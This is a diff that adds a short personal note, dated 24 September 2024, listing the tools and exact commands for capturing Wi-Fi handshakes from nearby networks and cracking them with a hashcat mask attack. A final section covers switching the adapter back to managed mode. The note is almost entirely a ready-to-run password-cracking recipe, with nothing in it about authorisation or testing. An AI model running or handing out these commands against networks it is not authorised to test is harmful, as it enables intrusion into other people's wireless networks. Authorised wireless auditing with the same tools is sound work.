@@ -1,0 +1,23 @@
+= 2024年09月24日
+
+== wifi
+
+Requirements:
+
+* aircrack-ng
+* hcxtools
+* hcxdumptool
+* hashcat
+
+. ``sudo hcxdumptool -i wlp6s0f3u2 -w WIFIs.pcapng``
+. ``hcxpcapngtool -o WIFIs.hc22000 WIFIs.pcapng``
+. ``hashcat -m 22000 WIFIs.hc22000 -a 3 -1 '?d?l' 'WIFIWIFI?1?1?1?1?1' -w 3``
+
+
+== Disabling Monitor Mode
+
+. ``ip link set wlo1 down``
+. ``iw wlo1 set type managed``
+. ``ip link set wlo1 up``
+
+Check with ``iwconfig`` if Mode is set to **Managed**.
